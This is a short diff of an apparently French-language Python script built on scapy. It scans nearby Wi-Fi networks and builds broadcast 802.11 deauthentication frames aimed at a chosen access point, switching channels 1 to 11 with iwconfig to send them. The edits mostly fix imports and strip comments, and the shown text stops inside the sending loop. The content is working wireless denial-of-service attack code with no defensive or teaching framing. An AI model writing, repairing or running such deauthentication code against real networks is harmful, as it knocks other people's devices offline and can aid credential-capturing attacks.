@@ -2,15 +2,14 @@ import os
 import time
 import logging
 import threading
-from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
+from scapy.all import sniff, sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
 
 # Configuration du logging
 logging.basicConfig(level=logging.INFO)
 
 def scan_wifi(interface):
     logging.info("Début du scan des réseaux Wi-Fi...")
-    packets = scapy.sniff(iface=interface, count=100, timeout=10)
+    packets = sniff(iface=interface, count=100, timeout=10)  # Correction ici
 
     networks = []
     for packet in packets:
@@ -27,10 +26,8 @@ def scan_wifi(interface):
     return networks
 
 def send_deauth_packets(interface, ap_address):
-    # Créer le paquet de désauthentification
     packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address)/Dot11Deauth(reason=7)
 
-    # Changer le canal et envoyer les paquets de désauthentification
     for channel in range(1, 12):
         os.system(f"iwconfig {interface} channel {channel}")
         logging.info(f"Envoi de désauthentification sur le canal {channel} à {ap_address}")
